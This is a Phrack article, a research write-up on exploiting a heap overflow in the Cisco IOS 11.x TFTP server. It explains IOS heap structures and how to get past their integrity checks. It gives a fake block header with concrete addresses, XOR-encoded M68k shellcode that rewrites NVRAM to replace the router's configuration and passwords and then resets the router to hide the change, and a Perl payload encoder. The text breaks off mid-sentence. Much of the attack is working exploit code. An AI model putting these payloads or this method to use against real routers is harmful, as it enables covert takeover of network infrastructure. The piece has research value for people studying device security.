### SOURCE: http://phrack.org/issues/60/7.html  
### AUTHOR: FX  
  
                             ==Phrack Inc.==  
  
               Volume 0x0b, Issue 0x3c, Phile #0x07 of 0x10  
  
|=-------------=[ Burning the bridge: Cisco IOS exploits ]=--------------=|  
|=-----------------------------------------------------------------------=|  
|=----------------=[ FX of Phenoelit <fx@phenoelit.de> ]=----------------=|  
  
--[ Contents  
  
  1 - Introduction and Limitations  
  2 - Identification of an overflow  
  3 - IOS memory layout sniplets  
  4 - A free() exploit materializes  
  5 - Writing (shell)code for Cisco  
  6 - Everything not covered in 1-5  
  
--[ 1 - Introduction and Limitations  
  
This article is to introduce the reader into the fun land of exploiting a  
routing device made by Cisco Systems. It is not the final word on this  
toppic and merely reflects our research results.  
  
According to Cisco Systems, around 85% of all software issues in IOS are  
the direct or indirect result of memory corruptions. By the time of this  
writing, yours truly is not aware of one single case, where overflowing  
something in Cisco IOS led to a direct overwrite of a return address.  
Although there are things like stacks in IOS, it seems to be very uncommon  
for IOS coders to use local function buffers. Therefore, most (if not all)  
overflows we will encounter are some way or anyother heap based.  
  
As a fellow researcher used to say, bugs are not an unlimited resource.  
Especially overflow bugs in Cisco IOS are fairly rare and not easily  
compared to each other. This article will therefore limit the discussion  
to one particular bug: the Cisco IOS TFTP server filename overflow. When  
using your router as a TFTP server for files in the flash filesystem, a  
TFTP GET request with a long (700 characters) filename will cause the  
router to crash. This happens in all IOS versions from 11.1 to 11.3. The  
reader might argue the point that this is no longer a widely used branch,  
but yours truly asks you to bare with him to the end of this article.  
  
The research results and methods presented here were collected during  
inspection and exploitation attempts using the already mentioned TFTP bug.  
By the time of this writing, other bugs are researched and different  
approaches are tested, but the here presented procedure is still seen as  
the most promising for widespread use. This translates to: use your  
favorite private Cisco IOS overflow and try it.  
  
--[ 2 - Identification of an overflow  
  
While the reader is probably used to identify stack smashing in a split  
second on a commonly used operating system, he might have difficulties  
identifying an overflow in IOS. As yours truly already mentioned, most  
overflows are heap based. There are two different ways in IOS to identify  
a heap overflow when it happens. Being connected to the console, the  
reader might see output like this:  
```  
01:14:16: %SYS-3-OVERRUN: Block overrun at 2C01E14 (red zone 41414141)  
-Traceback= 80CCC46 80CE776 80CF1BA 80CF300  
01:14:16: %SYS-6-MTRACE: mallocfree: addr, pc  
  20E3ADC,80CA1D8   20DFBE0,80CA1D8   20CF4FC,80CA1D8   20C851C,80CA1D8  
  20C6F20,80CA1D8   20B43FC,80CA1D8   20AE130,80CA1D8   2075214,80CA1D8  
01:14:16: %SYS-6-MTRACE: mallocfree: addr, pc  
  20651E0,80CA1D8   205EF04,80CA1D8   205B338,80CA1D8   205AB80,80CA1D8  
  20AFCF8,80CA1C6   205A664,80CA1D8   20AC56C,80CA1C6   20B1A88,80CA1C6  
01:14:16: %SYS-6-BLKINFO: Corrupted redzone blk 2C01E14, words 382,  
  alloc 80ABBFC, InUse, dealloc 206E2F0, rfcnt 1  
```  
In this case, an IOS process called "Check heaps", of which we will hear  
a lot more later, has identified a problem in the heap structures. After  
doing so, "Check heaps" will cause what we call a software forced crash.  
It means that the process kills the Cisco and makes it reboot in order  
to get rid of the problem. We all know this behavior from users of  
MS-DOS or Windows based systems. What happend here is that an A-Strip  
overwrote a boundary between two heap memory blocks. This is protected by  
what Cisco calls a "RED ZONE", which in fact is just a static canary.  
  
The other way a heap overflow could manifest itself on your console is an  
access violation:  
```  
*** BUS ERROR ***  
access address = 0x5f227998  
program counter = 0x80ad45a  
status register = 0x2700  
vbr at time of exception = 0x4000000  
special status word = 0x0045  
faulted cycle was a longword read  
```  
This is the case when you are lucky and half of the work is already done.  
IOS used a value that you somehow influenced and referenced to not  
readable memory.  Unfortunately, those overflows are later harder to  
exploit, since tracking is a lot more difficult.  
  
At this point in time, you should try to figure out under which exact  
circumstances the overflow happens - pretty much like with every other bug  
you find. If the lower limit of your buffer size changes, try to make sure  
that you don't play with the console or telnet(1) connections to the router  
during your tests. The best is always to test the buffer length with a just  
rebooted router. While it doesn't change much for most overflows, some  
react differently when the system is freshly rebooted compared to a system  
in use.  
  
--[ 3 - IOS memory layout sniplets  
  
To get any further with the overflow, we need to look at the way IOS  
organizes memory. There are basically two main areas in IOS: process memory  
and IO memory. The later is used for packet buffers, interface ring buffers  
and so on and can be of interest for exploitation but does not provide some  
of the critical things we are looking for. The process memory on the other  
hand behaves a lot like dynamic heap memory in Linux.  
  
Memory in IOS is split up in blocks. There seems to be a number of pointer  
tables and meta structures dealing with the memory blocks and making sure  
IOS can access them in an efficient way. But at the end of the day, the  
blocks are hold together in a linked list structure and store their  
management information mostly inline. This means, every memory block has  
a header, which contains information about the block, it's previous one  
and the next one in the list.  
```  
     +--------------+  
 .-- | Block A      | <-.  
 |   +--------------+   |  
 +-> | Block B      | --+  
     +--------------+  
     | Block C      |  
     +--------------+  
```  
The command "show memory processor" clearly shows the linked list  
structure.  
  
A memory block itself consists of the block header with all the inline  
management information, the data part where the actual data is stored  
and the red zone, which we already encountered. The format is as follows:  
```  
 |<-  32 bit  ->|        Comment  
 +--------------+  
 | MAGIC        |        Static value 0xAB1234CD  
 +--------------+  
 | PID          |        IOS process ID  
 +--------------+  
 | Alloc Check  |	 Area the allocating process uses for checks  
 +--------------+  
 | Alloc name   |        Pointer to string with process name  
 +--------------+  
 | Alloc PC     |	 Code address that allocated this block  
 +--------------+  
 | NEXT BLOCK   |        Pointer to the next block  
 +--------------+  
 | PREV BLOCK   |        Pointer to the previous block  
 +--------------+  
 | BLOCK SIZE   |        Size of the block (MSB marks "in use")  
 +--------------+  
 | Reference #  |        Reference count (again ???)  
 +--------------+  
 | Last Deallc  |	 Last deallocation address  
 +--------------+  
 |   DATA       |  
 |              |  
 ....  
 |              |  
 +--------------+  
 | RED ZONE     |        Static value 0xFD0110DF  
 +--------------+  
```  
In case this memory block is used, the size field will have it's most  
significant bit set to one. The size is represented in words (2 bytes),  
and does not include the block overhead. The reference count field is  
obviously designed to keep track of the number of processes using this  
block, but yours truly has never seen this being something else then 1  
or 0. Also, there seem to be no checks for this field in place.  
  
In case the memory block is not used, some more management data is  
introduced at the point where the real data was stored before:  
```  
 | [BLOCK HEAD] |  
 +--------------+  
 | MAGIC2       |        Static value 0xDEADBEEF  
 +--------------+  
 | Somestuff    |  
 +--------------+  
 | PADDING      |  
 +--------------+  
 | PADDING      |  
 +--------------+  
 | FREE NEXT    |        Pointer to the next free block  
 +--------------+  
 | FREE PREV    |        Pointer to the previous free block  
 +--------------+  
 |              |  
 ....  
 |              |  
 +--------------+  
 | RED ZONE     |        Static value 0xFD0110DF  
 +--------------+  
```  
Therefore, a free block is an element in two different linked lists:  
One for the blocks in general (free or not), another one for the list of  
free memory blocks. In this case, the reference count will be zero and  
the MSB of the size field is not set. Additionally, if a block was used  
at least once, the data part of the block will be filled with 0x0D0D0D0D.  
IOS actually overwrites the block data when a free() takes place to prevent  
software issues from getting out of hand.  
  
At this point, yours truly would like to return to the toppic of the "Check  
heaps" process. It is here to run about once a minute and checks the doubly  
linked lists of blocks. It basically walks them down from top to buttom to  
see if everything is fine. The tests employed seem to be pretty extensive  
compared to common operating systems such as Linux. As far as yours truly  
knows, this is what it checks:  
  1) Doest the block being with MAGIC (0xAB1234CD)?  
  2) If the block is in use (MSB in size field is set), check if the  
	   red zone is there and contains 0xFD0110DF.  
  3) Is the PREV pointer not NULL?  
  4) If there is a NEXT pointer ...  
   4.1) Does it point right after the end of this block?  
   4.2) Does the PREV pointer in the block pointed to by NEXT point  
	     back to this block's NEXT pointer?  
  5) If the NEXT pointer is NULL, does this block end at a memory  
	   region/pool boundary [NOTE: not sure about this one].  
  6) Does the size make sense? [NOTE: The exact test done here is  
	   still unknown]  
  
If one of these tests is not satisfied, IOS will declare itself unhappy and  
perform a software forced crash. To some extend, one can find out which  
test failed by taking a look at the console output line that says  
"validblock_diagnose = 1". The number indicates what could be called "class  
of tests", where 1 means that the MAGIC was not correct, 3 means that the  
address is not in any memory pool and 5 is really a bunch of tests but  
mostly indicates that the tests lined out in point 4.1 and 4.2 failed.  
  
--[ 4 - A free() exploit materializes  
  
Now that we know a bit about the IOS memory structure, we can plan to  
overflow with some more interesting data than just 0x41. The basic idea is  
to overwrite the next block header, hereby provide some data to IOS, and  
let it work with this data in a way that gives us control over the CPU. How  
this is usually done is explained in [1]. The most important difference  
here is, that we first have to make "Check heaps" happy. Unfortunately,  
some of the checks are also performed when memory is allocated or free()ed.  
Therefore, slipping under the timeline of one minute between two "Check  
heaps" runs is not an option here.  
  
The biggest problems are the PREV pointer check and the size field. Since  
the vulnerability we are working with here is a string overflow, we also  
have the problem of not being able to use 0x00 bytes. Let's try to deal  
with the issues we have one by one.  
  
The PREV pointer has to be correct. Yours truly has not found any way to  
use arbitrary values here. The check outlined in the checklist as 4.2 is a  
serious problem, since it is done on the block we are sitting in - not the  
one we are overflowing. To illustrate the situation:  
```  
     +--------------+  
     | Block Head   |  
     ...  
     | AAAAAAAAAAAA |    <--- You are here  
     | AAAAAAAAAAAA |  
     | AAAAAAAAAAAA |  
     +--------------+  
     | RED ZONE     |    <--- Your data here  
     +==============+  
     | Block Head   |  
     ...  
```  
We will call the uppermost block, who's data part we are overflowing, the  
"host block", because it basically "hosts" our evildoing. For the sake of  
clarity, we will call the overwritten block header the "fake block", since  
we try to fake it's contents.  
  
So, when "Check heaps" or comparable checks during malloc() and free() are  
performed on our host block, the overwrite is already noticed. First of  
all, we have to append the red zone canary to our buffer. If we overflow  
exactly with the number of bytes the buffer can hold and append the red  
zone dword 0xFD0110DF, "Check heaps" will not complain. From here one, it's  
fair game up to the PREV ptr - because the values are either static (MAGIC)  
or totally ignored (PID, Alloc ptrs).  
  
Assumed we overwrite RED ZONE, MAGIC, PID, the three Alloc pointer, NEXT  
and PREV, a check performed on the host block will already trigger a  
software forced crash, since the PREV pointer we overwrote in the next  
block does not point back to the host block. We have only one way today to  
deal with this issue: we crash the device. The reason behind this is, that  
we put it in a fairly predictable memory state. After a reboot, the memory  
is more or less structured the same way. This also depends on the amount  
of memory available in the device we are attacking and it's certainly not a  
good solution. When crashing the device the first time with an A-Strip, we  
can try to grab logging information off the network or the syslog server if  
such a thing is configured. Yours truly is totally aware of the fact that  
this prevents real-world application of the technique. For this article,  
let's just assume you can read the console output.  
  
Now that we know the PREV pointer to put into the fake block, let's go on.  
For now ignoring the NEXT pointer, we have to deal with the size field. The  
fact that this is a 32bit field and we are doing a string overflow prevents  
us from putting reasonable numbers in there. The smallest number for a used  
block would be 0x80010101 and for an unused one 0x01010101. This is much  
more than IOS would accept. But to make a long story short, putting  
0x7FFFFFFF in there will pass the size field checks. As simple as that.  
  
In this particular case, as with many application level service overflows  
in IOS, our host block is one of the last blocks in the chain. The most  
simple case is when the host block is the next-to-last block. And viola,  
this is the case with the TFTP server overflow. In other cases, the attack  
involves creating more than one fake block header and becomes increasingly  
complicated but not impossible. But from this point on, the discussion is  
pretty much centered around the specific bug we are dealing with.  
  
Assumed normal operation, IOS will allocate some block for storing the  
requested file name. The block after that is the remaining free memory.  
When IOS is done with the TFTP operation, it will free() the block it just  
allocated. Then, it will find out that there are two free blocks - one  
after the other - in memory. To prevent memory fragmentation (a big problem  
on heavy load routers), IOS will try to coalesce (merge) the free blocks  
into one. By doing so, the pointers for the linked lists have to be  
adjusted. The NEXT and PREV pointers of the block before that and the block  
after that (the remaining free memory) have to be adjusted to point to each  
other. Additionally, the pointers in the free block info FREE NEXT and FREE  
PREV have to be adjusted, so the linked list of free blocks is not broken.  
  
Out of the sudden, we have two pointer exchange operations that could  
really help us. Now, we know that we can not choose the pointer in PREV.  
Although, we can choose the pointer in NEXT, assumed that "Check heaps"  
does not fire before our free() tok place, this only allowes us to write  
the previous pointer to any writable location in the routers memory. Being  
usefull by itself, we will not look deeper into this but go on to the FREE  
NEXT and FREE PREV pointers. As the focused reader surely noticed, these  
two pointers are not validated by "Check heaps".  
  
What makes exploitation of this situation extremely convenient is that  
fact, that the pointer exchange in FREE PREV and FREE NEXT only relies on  
the values in those two fields. What happens during the merge operation is  
this:  
	+ the value in FREE PREV is written to where FREE NEXT points to  
	  plus an offset of 20 bytes  
	+ the value in FREE NEXT is written to where FREE PREV points to  
  
The only thing we need now is a place to write a pointer to. As with many  
other pointer based exploits, we are looking for a fairly static location  
in memory to do this. Such a static location (changes per IOS image) is the  
process stack of standard processes loaded right after startup. But how do  
we find it?  
  
In the IOS memory list, there is an element called the "Process Array".  
This is a list of pointers - one for every process currently running in  
IOS. You can find it's location by issuing a "show memory processor  
allocating-process" command (output trimmed):  
```  
radio#show memory processor allocating-process  
  
          Processor memory  
  
 Address Bytes Prev.   Next    Ref  Alloc Proc Alloc PC  What  
258AD20   1504 0       258B32C   1  *Init*     20D62F0   List Elements  
258B32C   3004 258AD20 258BF14   1  *Init*     20D6316   List  
...  
258F998   1032 258F914 258FDCC   1  *Init*     20E5108   Process Array  
258FDCC   1000 258F998 25901E0   1  Load Meter 20E54BA   Process Stack  
25901E0    488 258FDCC 25903F4   1  Load Meter 20E54CC   Process  
25903F4    128 25901E0 25904A0   1  Load Meter 20DD1CE   Process Events  
```  
This "Process Array" can be displayed by the "show memory" command:  
```  
radio#show memory 0x258F998  
0258F990:                   AB1234CD FFFFFFFE          +.4M...~  
0258F9A0: 00000000 020E50B6 020E5108 0258FDCC  ......P6..Q..X}L  
0258F9B0: 0258F928 80000206 00000001 020E1778  .Xy(...........x  
0258F9C0: 00000000 00000028 02590208 025D74C0  .......(.Y...]t@  
0258F9D0: 02596F3C 02598208 025A0A04 025A2F34  .Yo<.Y...Z...Z/4  
0258F9E0: 025AC1FC 025BD554 025BE920 025BFD2C  .ZA|.[UT.[i .[},  
0258F9F0: 025E6FF0 025E949C 025EA95C 025EC484  .^op.^...^)\.^D.  
0258FA00: 025EF404 0262F628 026310DC 02632FD8  .^t..bv(.c.\.c/X  
0258FA10: 02634350 02635634 0263F7A8 026418C0  .cCP.cV4.cw(.d.@  
0258FA20: 026435FC 026475E0 025D7A38 026507E8  .d5|.du`.]z8.e.h  
0258FA30: 026527DC 02652AF4 02657200 02657518  .e'\.e*t.er..eu.  
0258FA40: 02657830 02657B48 02657E60 0269DCFC  .ex0.e{H.e~`.i\|  
0258FA50: 0269EFE0 026A02C4 025DD870 00000000  .io`.j.D.]Xp....  
0258FA60: 00000000 025C3358 026695EC 0266A370  .....\3X.f.l.f#p  
```  
While you also see the already discussed block header format in action now,  
the interesting information starts at 0x0258F9C4. Here, you find the number  
of processes currently running on IOS. They are ordered by their process  
ID. What we are looking for is a process that gets executed every once in a  
while. The reason for this is, if we modify something in the process data  
structures, we don't want the process being active at this point in time,  
so that the location we are overwriting is static. For this reason, yours  
truly picked the "Load Meter" process, which is there to measure the system  
load and is fired off about every 30 seconds. Let's get the PID of  
"Load Meter":  
```  
radio#show processes cpu  
CPU utilization for five seconds: 2%/0%; one minute: 3%; five minutes: 3%  
 PID  Runtime(ms)  Invoked  uSecs    5Sec   1Min   5Min TTY Process  
   1          80      1765     45   0.00%  0.00%  0.00%   0 Load Meter  
```  
Well, conveniently, this process has PID 1. Now, we check the memory  
location the "Process Array" points to. Yours truly calls this memory  
location "process record", since it seems to contain everything IOS needs  
to know about the process. The first two entries in the record are:  
```  
radio#sh mem 0x02590208  
02590200:                   0258FDF4 025901AC          .X}t.Y.,  
02590210: 00001388 020E488E 00000000 00000000  ......H.........  
02590220: 00000000 00000000 00000000 00000000  ................  
```  
The first entry in this record is 0x0258FDF4, which is the process stack.  
You can compare this to the line above that says "Load Meter" and "Process  
Stack" on it in the output of "show memory processor allocating-process".  
The second element is the current stack pointer of this process  
(0x025901AC). By now it should also be clear why we want to pick a process  
with low activity. But surprisingly, the same procedure also works quite  
well with busier processes such as "IP Input". Inspecting the location of  
the stack pointer, we see something quite familiar:  
```  
radio#sh mem 0x025901AC  
025901A0:                            025901C4              .Y.D  
025901B0: 020DC478 0256CAF8 025902DE 00000000  ..Dx.VJx.Y.^....  
```  
This is classic C calling convention: first we find the former frame  
pointer and then we find the return address. Therefore, 0x025901B0 is the  
address we are targeting to overwrite with a pointer supplied by us.  
  
The only question left is: Where do we want the return address to point to?  
As already mentioned, IOS will overwrite the buffer we are filling with  
0x0D0D0D0D when the free() is executed - so this is not a good place to  
have your code in. On the other hand, the fake block's data section is  
already considered clean from IOS's point of view, so we just append our  
code to the fake block header we already have to send. But what's the  
address of this? Well, since we have to know the previous pointer, we can  
calculate the address of our code as offset to this one - and it turns out  
that this is actually a static number in this case. There are other, more  
advanced methods to deliver the code to the device, but let's keep focused.  
  
The TFTP filename we are asking for should now have the form of:  
```  
 +--------------+  
 | AAAAAAAAAAAA |  
 ...  
 | AAAAAAAAAAAA |  
 +--------------+  
 | FAKE BLOCK   |  
 |              |  
 ....  
 |              |  
 +--------------+  
 | CODE         |  
 |              |  
 ....  
 +--------------+  
```  
At this point, we can build the fake block using all the information we  
gathered:  
```  
    char                fakeblock[] =  
        "\xFD\x01\x10\xDF"      // RED  
        "\xAB\x12\x34\xCD"      // MAGIC  
        "\xFF\xFF\xFF\xFF"      // PID  
        "\x80\x81\x82\x83"      //  
        "\x08\x0C\xBB\x76"      // NAME  
        "\x80\x8a\x8b\x8c"      //  
  
        "\x02\x0F\x2A\x04"      // NEXT  
        "\x02\x0F\x16\x94"      // PREV  
  
        "\x7F\xFF\xFF\xFF"      // SIZE  
        "\x01\x01\x01\x01"      //  
        "\xA0\xA0\xA0\xA0"      // padding  
        "\xDE\xAD\xBE\xEF"      // MAGIC2  
        "\x8A\x8B\x8C\x8D"      //  
        "\xFF\xFF\xFF\xFF"      // padding  
        "\xFF\xFF\xFF\xFF"      // padding  
  
        "\x02\x0F\x2A\x24"      // FREE NEXT (in BUFFER)  
        "\x02\x59\x01\xB0"      // FREE PREV (Load Meter return addr)  
        ;  
```  
When sending this to the Cisco, you are likely to see something like this:  
```  
*** EXCEPTION ***  
illegal instruction interrupt  
program counter = 0x20f2a24  
status register = 0x2700  
vbr at time of exception = 0x4000000  
```  
depending on what comes after your fake block header. Of course, we did not  
provide code for execution yet. But at this point in time, we got the CPU  
redirected into our buffer.  
  
--[ 5 - Writing (shell)code for Cisco  
  
Before one can write code for the Cisco platform, you have to decide on the  
general processor architecture you are attacking. For the purpose of this  
paper, we will focus on the lower range devices running on Motorola 68k  
CPUs.  
  
Now the question is, what do you want to do with your code on the system.  
Classic shell code design for commonly used operating system platforms uses  
syscalls or library functions to perform some port binding and provide  
shell access to the attacker. The problem with Cisco IOS is, that we will  
have a hard time keeping it alive after we performed our pointer games.  
This is because in contrast to "normal" daemons, we destroyed the memory  
management of the operating system core and we can not expect it to cope  
with the mess we left for it.  
  
Additionally, the design of IOS does not feature transparent syscalls as  
far as yours truly knows. Because of it's monolithic design, things are  
linked together at build time. There might be ways to call different  
subfunctions of IOS even after an heap overflow attack, but it appears to  
be an inefficient route to take for exploitation and would make the whole  
process even more instable.  
  
The other way is to change the routers configuration and reboot it, so it  
will come up with the new config, which you provided. This is far more  
simpler than trying to figure out syscalls or call stack setups. The idea  
behind this approach is, that you don't need any IOS functionality anymore.  
Because of this, you don't have to figure out addresses and other vital  
information about the IOS. All you have to know is which NVRAM chips are  
used in the box and where there are mapped. This might sound way more  
complicated than identifying functions in an IOS image - but is not. In  
contrast to common operating systems on PC platforms, where the number of  
possible hardware combinations and memory mappings by far exceedes a  
feasable mapping range, it's the other way around for Cisco routers. You  
can have more than ten different IOS images on a single platform - and this  
is only one branch - but you always have the same general memory layout and  
the ICs don't change for the most part. The only thing that may differ  
between two boxes are the modules and the size of available memory (RAM,  
NVRAM and Flash), but this is not of big concern for us.  
  
The non-volatile random access memory (NVRAM) stores the configuration of a  
Cisco router in most cases. The configuration itself is stored in plain  
text as one continious C-style string or text file and is terminated by the  
keyword 'end' and one or more 0x00 bytes. A header structure contains  
information like the IOS version that created this configuration, the size  
of it and a checksum. If we replace the config on the NVRAM with our own  
and calculate the numbers for the header structure correctly, the router  
will use our IP addresses, routings, access lists and (most important)  
passwords next time it reloads.  
  
As one can see on the memory maps [2], there are one (in the worst case  
two) possible memory addresses for the NVRAM for each platform. Since  
the NVRAM is mapped into the memory just like most memory chips are, we  
can access it with simple memory move operations. Therefore, the only thing  
we need for our "shell" code is the CPU (M68k), it's address and data bus  
and the cooperation of the NVRAM chip.  
  
There are things to keep in mind about NVRAM. First of all, it's slow to  
write to. The Xicor chips yours truly encountered on Cisco routers require  
that after a write, the address lines are kept unchanged for the time the  
chip needs to write the data. A control register will signal when the write  
operation is done. Since the location of this control register is not known  
and might not be the same for different types of the same platform, yours  
truly prefers to use delay loops to give the chip time to write the data -  
since speed is not the attackers problem here.  
  
Now, that we know pretty much what we want to do, we can go on and look at  
the "how" part of things. First of all, you need to produce assembly for  
the target platform. A little known fact is, that IOS is actually build (at  
least some times) using GNU compilers. Therefore, the binutils[3] package  
can be compiled to build Cisco compatible code by setting the target  
platform for the ./configure run to --target=m68k-aout. When you are done,  
you will have a m68k-aout-as binary, which can produce your code and a  
m68k-aout-objdump to get the OP code values.  
  
In case the reader is fluent in Motorola 68000 assembly, I would like to  
apologize for the bad style, but yours truly grew up on Intel.  
Optimizations and style guides are welcome. Anyway, let's start coding.  
  
For a string overflow scenario like this one, the recommended way for small  
code is to use self-modification. The main code will be XOR'd with a  
pattern like 0x55 or 0xD5 to make sure that no 0x00 bytes show up. A  
bootstrap code will decode the main code and pass execution on to it. The  
Cisco 1600 platform with it's 68360 does not have any caching issues to  
worry us (thanks to LSD for pointing this out), so the only issue we have  
is avoiding 0x00 bytes in the bootstrap code. Here is how it works:  
```  
--- bootstrap.s ---  
	.globl _start  
_start:  
        | Remove write protection for NVRAM.  
	| Protection is Bit 1 in BR7 for 0x0E000000  
        move.l  #0x0FF010C2,%a1  
        lsr     (%a1)  
  
        | fix the brance opcode  
	| 'bne decode_loop' is OP code 0x6600 and this is bad  
        lea     broken_branch+0x101(%pc),%a3  
        sub.a   #0x0101,%a3  
        lsr     (%a3)  
  
        | perform dummy load, where 0x01010101 is then replaced  
        | by our stack ptr value due to the other side of the pointer  
	| exchange  
        move.l  #0x01010101,%d1  
  
        | get address of the real code appended plus 0x0101 to  
	| prevent 0x00 bytes  
        lea     xor_code+0x0101(%pc),%a2  
        sub.a   #0x0101,%a2  
        | prepare the decode register (XOR pattern)  
        move.w  #0xD5D5,%d1  
  
decode_loop:  
	| Decode our main payload code and the config  
        eor.w   %d1,(%a2)+  
	| check for the termination flag (greetings to Bine)  
        cmpi.l  #0xCAFEF00D,(%a2)  
broken_branch:  
        | this used to be 'bne decode_loop' or 0x6600FFF6  
        .byte   0xCC,0x01,0xFF,0xF6  
  
xor_code:  
  
--- end bootstrap.s ---  
```  
You may assemble the code into an object file using:  
`linux# m68k-aout-as -m68360 -pic --pcrel -o bootstrap.o bootstrap.s`  
  
There are a few things to say about the code. Number one are the first two  
instructions. The CPU we are dealing with supports write protection for  
memory segments [4]. Information about the memory segments is stored in  
so-called "Base Registers", BR0 to BR7. These are mapped into memory at  
0x0FF00000 and later. The one we are interested in (BR7) is at 0x0FF010C2.  
Bit0 tells the CPU if this memory is valid and Bit1 if it's write  
protected, so the only thing we need to do is to shift the lower byte one  
Bit to the right. The write protection Bit is cleared and the valid Bit is  
still in place.  
  
The second thing of mild interest is the broken branch code, but the  
explaination in the source should make this clear: the OP code of "BNE"  
unfortunately is 0x6600. So we shift the whole first word one to the right  
and when the code runs, this is corrected.  
  
The third thing is the dummy move to d1. If the reader would refer back to  
the place we discussed the pointer exchange, he will notice that there is a  
"back" part in this operation: namely the stack address is written to our  
code plus 20 bytes (or 0x14). So we use a move operation that translates to  
the OP code of 0x223c01010101, located at offset 0x12 in our code. After  
the pointer exchange takes place, the 0x01010101 part is replaced by the  
pointer - which is then innocently moved to the d1 register and ignored.  
  
When this code completed execution, the appended XOR'd code and config  
should be in memory in all clear text/code. The only thing we have to do  
now is copy the config in the NVRAM. Here is the appropriate code to do  
this:  
```  
--- config_copy.s ---  
        .globl  _start  
_start:  
  
	| turn off interrupts  
        move.w	#0x2700,%sr;  
	move.l	#0x0FF010C2,%a1  
	move.w	#0x0001,(%a1)  
  
	| Get position of appended config and write it with delay  
	lea	config(%pc),%a2  
	move.l	#0x0E0002AE,%a1  
	move.l	#0x00000001,%d2  
  
copy_confg:  
	move.b	(%a2)+,(%a1)+  
	| delay loop  
	move.l	#0x0000FFFF,%d1  
  write_delay:  
	  subx	%d2,%d1  
	  bmi	write_delay  
	cmp.l	#0xCAFEF00D,(%a2)  
	bne	copy_confg  
  
	| delete old config to prevent checksum errors  
delete_confg:  
	move.w	#0x0000,(%a1)+  
	move.l	#0x0000FFFF,%d1  
	| delay loop  
  write_delay2:  
	  subx	%d2,%d1  
	  bmi	write_delay2  
	cmp.l	#0x0E002000,%a1  
	blt	delete_confg  
  
	|  perform HARD RESET  
CPUReset:  
        move.w	#0x2700,%sr  
        moveal	#0x0FF00000,%a0  
        moveal	(%a0),%sp  
        moveal	#0x0FF00004,%a0  
        moveal	(%a0),%a0  
        jmp	(%a0)  
  
config:  
--- end config_copy.s ---  
```  
There is no particular magic about this part of the code. The only thing  
worth noticing is the final CPU reset. There is reason why we do this. If  
we just crash the router, there might be exception handlers in place to  
save the call stack and other stuff to the NVRAM. This might change  
checksums in an unpredictable way and we don't want to do this. The other  
reason is, that a clean reset makes the router look like it was rebooted by  
an administrator using the "reload" command. So we don't raise any  
questions despite the completely changed configuration ;-)  
  
The config_copy code and the config itself must now be XOR encoded with the  
pattern we used in the bootstrap code. Also, you may want to put the code  
into a nice char array for easy use in a C program. For this, yours truly  
uses a dead simple but efficient Perl script:  
 ``` 
--- objdump2c.pl ---  
#!/usr/bin/perl  
  
$pattern=hex(shift);  
$addressline=hex(shift);  
  
while (<STDIN>) {  
    chomp;  
    if (/[0-9a-f]+:\t/) {  
	(undef,$hexcode,$mnemonic)=split(/\t/,$_);  
	$hexcode=~s/ //g;  
	$hexcode=~s/([0-9a-f]{2})/$1 /g;  
  
	$alc=sprintf("%08X",$addressline);  
	$addressline=$addressline+(length($hexcode)/3);  
  
	@bytes=split(/ /,$hexcode);  
	$tabnum=4-(length($hexcode)/8);  
	$tabs="\t"x$tabnum;  
	$hexcode="";  
	foreach (@bytes) {  
		$_=hex($_);  
		$_=$_^$pattern if($pattern);  
		$hexcode.=sprintf("\\x%02X",$_);  
	}  
	print "\t\"".$hexcode."\"".$tabs."//".$mnemonic." (0x".$alc.")\n";  
    }  
}  
--- end objdump2c.pl ---  
```  
You can use the output of objdump and pipe it into the script. If the  
script got no parameter, it will produce the C char string without  
modifications. The first optional paramter will be your XOR pattern and the  
second one can be the address your buffer is going to reside at. This makes  
debugging the code a hell of a lot easier, because you can refer to the  
comment at the end of your C char string to find out which command made the  
Cisco unhappy.  
  
The output for our little config_copy.s code XOR'd with 0xD5 looks like  
this (trimmed for phrack):  
```  
linux# m68k-aout-objdump -d config_copy.o |  
> ./objdump2XORhex.pl 0xD5 0x020F2A24  
  
"\x93\x29\xF2\xD5"              //movew #9984,%sr (0x020F2A24)  
"\xF7\xA9\xDA\x25\xC5\x17"      //moveal #267391170,%a1 (0x020F2A28)  
"\xE7\x69\xD5\xD4"              //movew #1,%a1@ (0x020F2A2E)  
"\x90\x2F\xD5\x87"              //lea %pc@(62 <config>),%a2 (0x020F2A32)  
"\xF7\xA9\xDB\xD5\xD7\x7B"      //moveal #234881710,%a1 (0x020F2A36)  
"\xA1\xD4"                      //moveq #1,%d2 (0x020F2A3C)  
"\xC7\x0F"                      //moveb %a2@+,%a1@+ (0x020F2A3E)  
"\xF7\xE9\xD5\xD5\x2A\x2A"      //movel #65535,%d1 (0x020F2A40)  
"\x46\x97"                      //subxw %d2,%d1 (0x020F2A46)  
"\xBE\xD5\x2A\x29"              //bmiw 22 <write_delay> (0x020F2A48)  
"\xD9\x47\x1F\x2B\x25\xD8"      //cmpil #-889262067,%a2@ (0x020F2A4C)  
"\xB3\xD5\x2A\x3F"              //bnew 1a <copy_confg> (0x020F2A52)  
"\xE7\x29\xD5\xD5"              //movew #0,%a1@+ (0x020F2A56)  
"\xF7\xE9\xD5\xD5\x2A\x2A"      //movel #65535,%d1 (0x020F2A5A)  
"\x46\x97"                      //subxw %d2,%d1 (0x020F2A60)  
"\xBE\xD5\x2A\x29"              //bmiw 3c <write_delay2> (0x020F2A62)  
"\x66\x29\xDB\xD5\xF5\xD5"      //cmpal #234889216,%a1 (0x020F2A66)  
"\xB8\xD5\x2A\x3D"              //bltw 32 <delete_confg> (0x020F2A6C)  
"\x93\x29\xF2\xD5"              //movew #9984,%sr (0x020F2A70)  
"\xF5\xA9\xDA\x25\xD5\xD5"      //moveal #267386880,%a0 (0x020F2A74)  
"\xFB\x85"                      //moveal %a0@,%sp (0x020F2A7A)  
"\xF5\xA9\xDA\x25\xD5\xD1"      //moveal #267386884,%a0 (0x020F2A7C)  
"\xF5\x85"                      //moveal %a0@,%a0 (0x020F2A82)  
"\x9B\x05"                      //jmp %a0@ (0x020F2A84)  
```  
Finally, there is only one more thing to do before we can compile this all  
together: new have to create the new NVRAM header and calculate the  
checksum for our new config. The NVRAM header has the form of:  
```  
typedef struct {  
    u_int16_t       magic;  	// 0xABCD  
    u_int16_t       one;	// Probably type (1=ACII, 2=gz)  
    u_int16_t       checksum;  
    u_int16_t       IOSver;  
    u_int32_t       unknown;	// 0x00000014  
    u_int32_t       cfg_end;	// pointer to first free byte in  
				// memory after config  
    u_int32_t       size;  
} nvhdr_t;  
```  
Obviously, most values in here are self-explainory. This header is not  
nearly as much tested as the memory structures, so IOS will forgive you  
strange values in the cfg_end entry and such. You can choose the IOS  
version, but yours truly recommends to use something along the lines of  
